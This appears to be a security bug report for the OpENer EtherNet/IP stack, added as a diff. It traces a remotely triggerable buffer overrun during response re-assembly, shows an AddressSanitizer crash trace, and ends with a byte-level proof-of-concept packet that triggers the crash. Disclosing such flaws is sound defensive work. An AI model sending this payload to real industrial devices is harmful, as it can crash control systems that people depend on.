@@ -1,0 +1,49 @@
+issue #567
+
+Summary
+
+I found a remotely reachable server-side crash in the latest master branch of OpENer while sending a crafted EtherNet/IP SendRRData request to a real OpENer server instance.
+
+Although the final crash is observed in AddIntToMessage() (source/src/enet_encap/endianconv.c:136), the root cause is earlier in the request handling path:
+
+CreateCommonPacketFormatStructure() accepts a malformed CPF with an invalid item_count / inconsistent length.
+The malformed unconnected Message Router payload reaches GetAttributeList().
+GetAttributeList() parses an attacker-controlled, excessively large attribute_count_request and starts building an oversized inner Message Router response.
+EncodeMessageRouterResponseData() copies that inner response into the outer ENIPMessage without validating the remaining destination capacity.
+The copy overruns message_buffer[512] and overwrites the adjacent current_message_position field.
+A later AddIntToMessage() dereferences the corrupted pointer and crashes.
+In other words, the visible crash site is AddIntToMessage(), but the actual memory corruption happens earlier during response re-assembly in EncodeMessageRouterResponseData().
+
+Actual Behavior If Applicable
+
+==101374==ERROR: AddressSanitizer: SEGV on unknown address (pc 0x5e0ac8d3f929 bp 0x7fffe45c6640 sp 0x7fffe45c6640 T0)
+
+Asan
+
+AddressSanitizer:DEADLYSIGNAL
+=================================================================
+==101374==ERROR: AddressSanitizer: SEGV on unknown address (pc 0x5e0ac8d3f929 bp 0x7fffe45c6640 sp 0x7fffe45c6640 T0)
+==101374==The signal is caused by a READ memory access.
+==101374==Hint: this fault was caused by a dereference of a high value address (see register values below).  Disassemble the provided pc to learn which register was used.
+    #0 0x5e0ac8d3f929 in AddIntToMessage /root/wc/opener-verify/source/src/enet_encap/endianconv.c:136:49
+    #1 0x5e0ac8d38072 in EncodeSockaddrInfoItemTypeId /root/wc/opener-verify/source/src/enet_encap/cpf.c:595:3
+    #2 0x5e0ac8d38072 in AssembleLinearMessage /root/wc/opener-verify/source/src/enet_encap/cpf.c:696:9
+    #3 0x5e0ac8d36eaa in NotifyCommonPacketFormat /root/wc/opener-verify/source/src/enet_encap/cpf.c:70:30
+    #4 0x5e0ac8d3b438 in HandleReceivedSendRequestResponseDataCommand /root/wc/opener-verify/source/src/enet_encap/encap.c:558:22
+    #5 0x5e0ac8d39aea in HandleReceivedExplictTcpData /root/wc/opener-verify/source/src/enet_encap/encap.c:186:26
+    #6 0x5e0ac8d1b30b in HandleDataOnTcpSocket /root/wc/opener-verify/source/src/ports/generic_networkhandler.c:864:30
+    #7 0x5e0ac8d19d24 in NetworkHandlerProcessCyclic /root/wc/opener-verify/source/src/ports/generic_networkhandler.c:497:32
+    #8 0x5e0ac8d18a44 in executeEventLoop /root/wc/opener-verify/source/src/ports/POSIX/main.c:261:24
+    #9 0x5e0ac8d18a44 in main /root/wc/opener-verify/source/src/ports/POSIX/main.c:229:12
+    #10 0x733288e2a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
+    #11 0x733288e2a28a in __libc_start_main csu/../csu/libc-start.c:360:3
+    #12 0x5e0ac8c3f454 in _start (/root/wc/opener-verify/build-asan-1/src/ports/POSIX/OpENer+0x2e454) (BuildId: 92cc5930c2b20f5b29383eb48552639fdc1a55ab)
+
+AddressSanitizer can not provide additional info.
+SUMMARY: AddressSanitizer: SEGV /root/wc/opener-verify/source/src/enet_encap/endianconv.c:136:49 in AddIntToMessage
+==101374==ABORTING
+
+PoC
+
+<6f><00><30><01><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><00><00><00><00><30><30><30><30><30><30><30><30><00><00><00><00><b2><00><08><00><03><03><20><01><24><01><30><30><00><80><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30><30>
+
